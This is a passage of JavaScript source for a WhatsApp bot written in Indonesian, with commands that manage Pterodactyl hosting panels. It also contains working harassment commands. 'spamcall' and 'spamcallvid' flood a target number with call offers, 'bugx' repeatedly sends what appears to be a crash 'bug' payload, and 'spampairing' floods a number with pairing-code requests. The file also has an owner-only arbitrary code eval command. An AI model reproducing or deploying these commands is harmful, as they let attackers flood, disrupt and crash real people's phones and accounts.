if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await balzzx.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break;
case "deladmin": {
if (!isCreator) return m.reply("Khusus Owner")
if (!text) return m.reply("idnya")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break;
case "delpanel": {
if (!isCreator) return m.reply("Khusus Owner")
if (!text) return m.reply("idnya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break;
case 'spamcall': {
if (!isPremium) return 
if (!q) return m.reply("Example Use.\n calloffer 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`*Success Send Spam Call To ${isTarget}*`)
await delay(1000);
for (let i = 0; i < 20; i++) {
await sendOfferCall(isTarget)
}
}
break;
case 'spamcallvid': {
if (!isPremium) return 
if (!q) return m.reply("Example Use.\n calloffervideo 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`*Success Send Spam Call Video To ${isTarget}*`)
await delay(1000);
for (let i = 0; i < 20; i++) {
await sendOfferVideoCall(isTarget)
}
}
break;
case 'bugx': {
if (!isPremium) return 
if (!q) return m.reply("Example Use.\n bugx 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`*Success Send Bug To ${isTarget}*`)
await delay(1000);
for (let i = 0; i < 20; i++) {
await ransInvAdmn(isTarget)
}
}
break;
case "cekidch": {
if (!isCreator) return
if (!text) return m.reply("Link Nya Mana Goblog")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await balzzx.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break;
case "idgc": case "cekidgc": {
if (!isCreator) return
if (!m.isGroup) return m.Reply(mess.group)
m.reply(m.chat)
}
break;
case 'spampairing': {
 if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
 let [peenis, pepekk = "200"] = text.split("|")

 let target = peenis.replace(/[^0-9]/g, '').trim()
 let {
 default: makeWaSocket,
 useMultiFileAuthState,
 fetchLatestBaileysVersion
 } = require('@whiskeysockets/baileys')
 let {
 state
 } = await useMultiFileAuthState('./media/tmp/pepek')
 let {
 version
 } = await fetchLatestBaileysVersion()
 let pino = require("pino")
 let sucked = await makeWaSocket({
 auth: state,
 version,
 logger: pino({
 level: 'fatal'
 })
 })
 m.reply(`_Succes Spam Pairing To ${target}_`)
 for (let i = 0; i < pepekk; i++) {
 await delay(1500)
 let prc = await sucked.requestPairingCode(target)
 await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
 }
 await delay(15000)
 }
 break;


//~~~~~End Case~~~~~//


default:
if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

}
} catch (err) {
console.log(util.format(err))
}
}

//~~~~~Status Diperbarui~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
